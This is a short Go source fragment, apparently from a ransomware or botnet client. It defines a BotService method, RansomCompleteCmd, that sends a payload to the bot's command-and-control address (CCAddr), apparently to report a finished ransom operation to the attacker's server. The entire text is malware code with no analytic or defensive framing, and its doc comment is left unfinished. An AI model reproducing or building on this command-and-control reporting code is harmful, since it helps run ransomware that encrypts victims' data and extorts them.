package tcp

//RansomCompleteCmd is
func (b *BotService) RansomCompleteCmd(payload []byte) error {
	return sendData(b.Bot.CCAddr, payload)
}
